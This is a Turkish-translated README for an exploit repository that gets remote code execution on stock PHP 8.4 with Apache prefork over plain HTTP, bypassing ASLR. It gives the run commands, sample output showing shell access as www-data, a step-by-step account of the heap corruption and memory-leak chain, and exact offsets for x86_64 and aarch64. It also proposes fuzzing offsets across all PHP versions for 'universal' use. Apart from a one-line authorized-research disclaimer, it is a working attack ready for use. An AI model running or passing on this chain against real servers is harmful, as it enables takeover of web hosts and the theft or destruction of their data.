# php2shell - resmi ortam; display_errors gerekmez, memory_limit değiştirilmez

Türkçe | [中文](readme_zh.md) | [English](readme_en.md) | [日本語](readme_ja.md)

> **Çeviri notu:** Bu, [9bie/php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp)
> deposunun Türkçeleştirilmiş sürümüdür. Dökümantasyon (markdown dosyaları) Türkçeye çevrilmiştir;
> kod, log ve araçlar orijinaliyle birebir aynıdır. Yalnızca yetkili ortamlarda güvenlik araştırması
> ve çoğaltma (reproduction) amaçlıdır.

**Resmi prefork yapılandırması (MaxRequestWorkers=150) altında**, tamamen uzaktan, yalnızca HTTP ile,
hedef sayfası sadece `<?php echo "OK\n"; ?>` iken ve hedef taraftaki PHP'ye hiçbir dosya yazmadan;
tek komutla RCE elde edilir:

- stock resmi imaj + resmi ini + resmi worker: **10/10**
- tek worker baseline (erken kalibrasyon/hata ayıklama): **20/20**
- tek seferde yaklaşık 3–4 saniye (149 yer tutucu bağlantı dahil), sabitlenen worker yeniden başlamaz, hedef ini değiştirilmez

# Genel (universal) kullanım

Teorik olarak, tüm PHP sürümlerinin offset'lerini hesaplayıp bu offset'leri kullanarak toplu
fuzz yaparsanız, er ya da geç bir fuzz denemesi RCE'yi yakalar. Zaten worker çökse de yeniden
başlayacağı için hedefi kalıcı olarak çökertme endişesi yoktur.

Worker hakkında: resmi prefork'un `MaxRequestWorkers=150` değeri de aşıldı. Script önce 149
worker'ın tamamlanmamış isteklerini işgal eder, ardından A1/B1/A2/B2'yi geriye kalan aynı child
process'e sabitler; tek worker yalnızca erken dönem hata ayıklama biçimiydi (`--workers 1` ile hâlâ
çoğaltılabilir).

## Hızlı başlangıç (resmi php.ini-production / display_errors=Off / 128M)

```bash
git clone https://github.com/9bie/php2shell-bypass-aslr-exp.git
cd php2shell-bypass-aslr-exp

# 1) Hedefi başlat: stock resmi imaj; konteyner içinde yalnızca resmi php.ini-production'ı php.ini olarak kopyala
./pure/run_pure.sh
# target: OK
# architecture: x86_64 (run exploit with --arch x86_64)
# PHP 8.4.26 ...
# display_errors => Off => Off
# memory_limit => 128M => 128M
# workers: official (run exploit with --workers 150)

# 2) Tek komut: A1 -> B1 sızıntı (leak) -> A2 -> B2 -> id
python3 exploit.py --port 18110
#       --arch auto (varsayılan): x86_64 / aarch64 otomatik tanınır
#       pinned 150/150 workers (149 holders)
# [try 1] A1: END-cleanup send_cookie OOM
# [try 1] B1: stale-id OOB read (chunk base + libphp)
#       arch=x86_64 decoded=819208 zval_ptr_dtor=0x7fe00ef5db60 -> libphp=0x7fe00e8ff000
#       chunk buckets: [('0x7fe00c600000', 7495), ('0x7fe00ee00000', 1095),
#                       ('0x7fe00cc00000', 87), ('0x7fe00c400000', 79)]
# [try 1] A2 + B2: main=0x7fe00cc00000 S=0x7fe00ccf8398 zif_system=0x7fe00ed64370
# [4/4] RCE OK; proof .../out/p1:
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

PHP/Apache derlemeden, imaj build etmeden, gdb iliştirmeden ve hedef ini'yi değiştirmeden.
`pure/run_pure.sh` varsayılan olarak `p2s-pure-18110` konteynerini ve `18110` portunu kullanır;
varsayılan olarak resmi prefork yapılandırmasını (MaxRequestWorkers=150) kullanır ve başlatma
tamamlanınca gerçek mimari, ini ve MPM değerlerini yazdırır. Yalnızca `--single` bayrağı,
resmi olmayan tek worker override'ı olan `pure/docker/apache-single-worker.conf`'u iliştirir
(`--workers 1` ile birlikte kullanılır). `docker/apache.conf` ise yalnızca eski harness için
tutulan bir uyumluluk sembolik bağıdır (symlink) ve aynı dosyaya işaret eder.
Linux'ta docker grubu yetkisi yoksa script otomatik olarak `sudo docker` kullanmaya geçer;
açıkça `DOCKER="sudo docker" ./pure/run_pure.sh` de denilebilir. `--dbg` yalnızca sembollü
(symbols içeren) aynı build ile çevrimdışı kalibrasyon yapmak için kullanılır.

Sık kullanılan parametreler:

```bash
# Yeni ASLR ile tekrar test (konteyneri yeniden başlat)
python3 exploit.py --port 18110 --restart p2s-pure-18110

# Resmi worker varsayılandır; --single ile başlatılan tek worker hedefi için --workers 1 kullanın
python3 exploit.py --port 18110 --workers 1

# ARM64 açıkça da belirtilebilir (varsayılan --arch auto otomatik tanır)
python3 exploit.py --arch aarch64 --port 18110 --workers 1

# Özel komut: komutu mount edilen dizine yaz, ardından sh ile çalıştır
printf 'id; uname -a > /out/p1\n' > out/c
python3 exploit.py --port 18110 --cmd 'sh</out/c'
```

`--retries` varsayılanı 3'tür; herhangi bir sınır-dışı (OOB) pencerede en sık görülen işaretçi
`zval_ptr_dtor` değilse, script bu sızıntıyı `libphp-main` için makul bir aralık kontrolüyle eler
ve tüm zinciri baştan çalıştırır.

## Bu saf (pure) HTTP zinciri

Hedef sayfası yalnızca `<?php echo "OK\n"; ?>` içerir; saldırı trafiği yalnızca chunked multipart
ve sıradan GET/POST'tan oluşur:

0. **worker pinning**: resmi `MaxRequestWorkers=150`; önce yalnızca body'sinin yarısı gönderilmiş
   149 POST açılarak diğer child'lar işgal edilir; böylece A1/B1/A2/B2'nin hepsi geriye kalan aynı
   child'a düşer ve istekler arası (cross-request) sarkan işaretçiler (dangling pointer) geçerli olur.
1. **chunked ile `post_max_size` atlatma**: `Content-Length` olmadığında `content_length=0` olur;
   `rfc1867_post_handler`'ın başındaki kontrol atlanır ve heap şekillendirmesi (heap shaping) için
   8M'den çok daha büyük body gönderilebilir.
2. **A1**: 860 adet depth-64 iç içe (nested) dosya alanı + filler + büyük değer + 4000B
   `PHP_SESSION_UPLOAD_PROGRESS`; END cleanup içindeki `php_url_encode`'da OOM oluşur; bailout
   sarkan `PS(id)` / `PS(mod_data)` bırakır, `send_cookie=1`.
3. **B1 (sınır-dışı okuma)**: güvenli close'dan sonra `PS(id)`, sahte bir `zend_string` başlığına
   (len=0xC8000, data `/` içerir) işaret ettirilir; `Set-Cookie`, id chunk'ından sonraki 800KB belleği
   encode ederek dışarı sızdırır. Pencerede eşzamanlı olarak şunlar bulunur:
   - 2MiB hizalı chunk işaretçi kümesi → id chunk / main chunk base;
   - `G:400`'ün id chunk kuyruğunda bıraktığı delik, 900 iç içe dizi alanıyla doldurulur;
     gerçek HashTable'ın `pDestructor = zval_ptr_dtor` değeri 1095 kez ortaya çıkar
     → `libphp = değer - 0x65EB60`.
4. **A2 + B2**: cheap-OOM, `PS(hash_serialize_verifier)`'i heap üzerine (`main+0x7D720`) işaret ettirir;
   B2, 384B'lık bir referans değeriyle bunu `S=main+0xF8398`'deki bir zval'e işaret edecek şekilde üzerine
   yazar; S konumunda sahte bir zend_array'in `pDestructor = zif_system` (`libphp+0x465370`) değeri
   oluşturulur ve shutdown sırasında `zend_hash_destroy`, `system("id>/out/p1")`'i çağırır.

Offset'ler (bu build için, ASLR'den bağımsız):

| Sembol/konum | x86_64 | aarch64 |
|---|---|---|
| sızdırılan `zval_ptr_dtor` işaretçisi | `libphp+0x65EB60` | `libphp+0x63812B` |
| `zif_system` | `libphp+0x465370` | `libphp+0x42CD70` |
| sahte array `S` | `main+0xF8398` | `main+0xF8398` |
| A2'nin `hsv`'si | `main+0x7D720` | `main+0x7D720` |

aarch64'te `zval_ptr_dtor` ELF sembolü `0x638120`'de bulunur, ancak bu sızıntıda tekrar eden
işaretçi ondan 11 bayt sonradadır; bu yüzden profil `0x63812B`'yi çıkarır.
Hedef ortam: Debian 13 (trixie), Apache 2.4.69 prefork, PHP 8.4.26 NTS mod_php, files session
handler. Farklı bir PHP build'i/sürümü, offset'lerin yeniden kalibre edilmesini gerektirir;
ASLR her konteyner başlangıcında değişir, zincirdeki iki sızıntı bunu kendisi hesaplar.

## Kanıt (evidence)

- Mekanizma ve kalibrasyon: [pure/RESEARCH_PURE_128M.md](pure/RESEARCH_PURE_128M.md)
- Tam zincir scripti: [exploit.py](exploit.py) (`pure/pwn_pure.py` takma ad olarak tutulur)
- Hata ayıklama imajı toplu log: [pure/evidence/pwn_pure_batch_20261022.log](pure/evidence/pwn_pure_batch_20261022.log)
- Resmi imaj logu: [pure/evidence/pwn_pure_official_20261022.log](pure/evidence/pwn_pure_official_20261022.log)
- Resmi worker logu: [pure/evidence/official_workers_20261022.log](pure/evidence/official_workers_20261022.log)
- Yerel (native) ARM64 resmi imaj logu (10/10 sıfırdan konteyner): [pure/evidence/arm64_stock_20261023.log](pure/evidence/arm64_stock_20261023.log)
- Yerel ARM64 resmi worker logu (3/3 sıfırdan konteyner): [pure/evidence/arm64_official_workers_20261023.log](pure/evidence/arm64_official_workers_20261023.log)
- proof: [pure/evidence/pwn_pure_proof_p1.txt](pure/evidence/pwn_pure_proof_p1.txt)

## Eski hat (legacy, bu hedef değildir)

Erken commit'lerdeki `exploit.py`, **özel (custom)** bir `docker/php.ini` kullanır
(`display_errors=On`, `memory_limit=8M`, `max_input_vars=1000`); bu README'deki resmi yapılandırma
hedefiyle ilgisizdir ve [archive/legacy-8m/exploit.py](archive/legacy-8m/exploit.py)'ye arşivlenmiştir.
Aynı dizindeki [HTTP_HEAP_LEAK.md](archive/legacy-8m/HTTP_HEAP_LEAK.md),
[ASLR_PURE_HTTP.md](archive/legacy-8m/ASLR_PURE_HTTP.md) vb. dosyalar o hattı anlatır;
eski `docker/php.ini`, `docker/docker-compose.yml`, `docker/offsets.py` ve
`lab/apache2_aslr.conf` de `archive/legacy-8m/docker|lab/` altına arşivlenmiştir.
Gerçek tek worker yapılandırması ve hedef sayfası `pure/docker/` içindedir
(`apache-single-worker.conf`, `www/index.php`); `docker/` yalnızca oraya işaret eden
`apache.conf` ve `www` adlı iki uyumluluk symlink'ini tutar.

## Çoğaltma (reproduction) beyanı

- Hedef yapılandırma, resmi `php.ini-production`'ın ta kendisidir (`display_errors=Off`,
  `memory_limit=128M`) ve resmi prefork worker'dır (MaxRequestWorkers=150): özel ini yok,
  `display_errors=On` bağımlılığı yok, hedef tarafı dosyası yok, `session_start()` yok,
  teslim (delivery) yolunda gdb kullanılmaz.
- Yalnızca yetkili ortamlarda güvenlik açığı araştırması ve çoğaltma amaçlıdır.
